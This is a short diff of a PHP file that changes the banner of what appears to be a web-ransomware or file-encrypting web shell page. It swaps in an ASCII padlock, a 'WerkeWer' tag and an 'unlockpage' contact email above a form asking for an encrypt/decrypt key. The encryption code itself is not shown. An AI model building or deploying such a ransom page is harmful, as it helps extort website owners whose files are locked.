@@ -198,8 +198,23 @@ switch ($_POST['method']) {
 }else{
 ?>
 <center>
-<h1>werkewer </h1>
-<p>unlockpage001[at]gmail[dot]com</p>
+<pre>
+
+            .-""-.
+           / .--. \
+          / /    \ \
+          | |    | |
+          | |.-""-.|
+         ///`.::::.`\
+        ||| ::/  \:: ;
+        ||; ::\__/:: ;
+         \\\ '::::' /
+          `=':-..-'`
+          
+          WerkeWer
+
+ -[ Contact : unlockpage001[at]gmail[dot]com ]-
+</pre>
 <form action="" method="post" style=" text-align: center;">
       <label>Key : </label>
       <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
